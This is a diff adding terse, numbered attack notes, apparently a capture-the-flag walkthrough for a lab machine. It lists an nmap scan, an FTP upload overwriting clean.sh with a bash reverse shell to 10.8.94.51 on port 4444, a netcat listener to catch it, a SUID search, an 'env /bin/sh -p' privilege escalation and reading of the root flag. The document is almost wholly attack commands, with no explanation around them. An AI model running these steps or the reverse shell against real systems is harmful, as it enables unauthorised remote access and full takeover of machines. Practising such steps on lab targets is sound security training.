@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.43.215
+2 - ftp 10.10.43.215
+3 - cat > clean.sh << EOF
+#!/bin/bash
+bash -i >& /dev/tcp/10.8.94.51/4444 0>&1
+
+4 - ftp 10.10.43.215 -> put clean.sh
+5 - nc -lvnp 4444 (wait 1 minute)
+6 - cat user.txt
+7 - find / -perm -u=s -type f 2>/dev/null
+8 - env /bin/sh -p
+9 - cat /root/root.txt
